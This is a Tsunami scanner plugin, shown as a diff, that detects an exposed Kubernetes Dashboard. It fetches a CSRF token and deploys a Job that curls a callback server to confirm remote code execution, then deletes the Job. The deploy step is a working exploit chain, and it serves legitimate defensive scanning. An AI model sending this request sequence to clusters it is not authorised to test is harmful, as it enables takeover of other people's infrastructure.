@@ -1,0 +1,136 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "K8s_ExposeUI"
+  author: "jamesFoxxx"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "K8S_EXPOSED_UI"
+  }
+  severity: CRITICAL
+  title: "Exposed Kubernetes Dashboard"
+  description: "Kubernetes Dashboard is exposed to the internet without proper authentication, allowing remote code execution. This vulnerability can lead to unauthorized access and control over the Kubernetes cluster."
+  recommendation: "Don't Expose the Kubernetes Dashboard to the Internet. If you must expose it, ensure that proper authentication and authorization mechanisms are in place. Regularly update your Kubernetes components to mitigate known vulnerabilities."
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "is_kubernetes_dashboard"
+  http_request: {
+    method: GET
+    uri: "/api/v1/namespace"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: { } contains: "\"name\": \"kubernetes-dashboard\"," }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "retrieve_csrftoken"
+  http_request: {
+    method: GET
+    uri: "/api/v1/csrftoken/appdeploymentfromfile"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "\"token\": \"" }
+        ]
+      }
+      extract_all: {
+        patterns: [
+          {
+            from_body: {}
+            regexp: "\\\"token\\\": \\\"([a-zA-Z0-9_:-]+)\\\""
+            variable_name: "csrftoken"
+          }
+        ]
+      }
+    }
+  }
+}
+actions: {
+  name: "trigger_code_execution"
+  http_request: {
+    method: POST
+    uri: "/api/v1/appdeploymentfromfile"
+    headers: [
+      { name: "X-CSRF-TOKEN" value: "{{ csrftoken }}" },
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: '{"name":"","namespace":"default","content":"apiVersion: batch/v1\\nkind: Job\\nmetadata:\\n  name: tsunami-security-scanner-job\\n  labels:\\n    app: curl-example\\nspec:\\n  template:\\n    metadata:\\n      labels:\\n        app: curl-example\\n    spec:\\n      containers:\\n      - name: curl-container\\n        image: curlimages/curl:latest\\n        command: [\\"/bin/sh\\", \\"-c\\"]\\n        args:\\n        - |\\n          curl -s {{ T_CBS_URI }} || exit 0\\n      restartPolicy: OnFailure\\n  backoffLimit: 3\\n  completions: 1","validate":true}'
+    response: {
+      http_status: 201
+    }
+  }
+  cleanup_actions: "cleanup_job"
+}
+
+actions: {
+  name: "cleanup_job"
+  http_request: {
+    method: DELETE
+    uri: "/api/v1/_raw/job/namespace/default/name/tsunami-security-scanner-job"
+    response: {
+      http_status: 200
+    }
+  }
+}
+actions: {
+  name: "initial_cleanup_job"
+  http_request: {
+    method: DELETE
+    uri: "/api/v1/_raw/job/namespace/default/name/tsunami-security-scanner-job"
+  }
+}
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 10000 } }
+}
+actions: {
+  name: "sleep_for_job_delete"
+  utility: { sleep: { duration_ms: 2000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "is_kubernetes_dashboard",
+    "initial_cleanup_job",
+    "sleep_for_job_delete",
+    "retrieve_csrftoken",
+    "trigger_code_execution",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
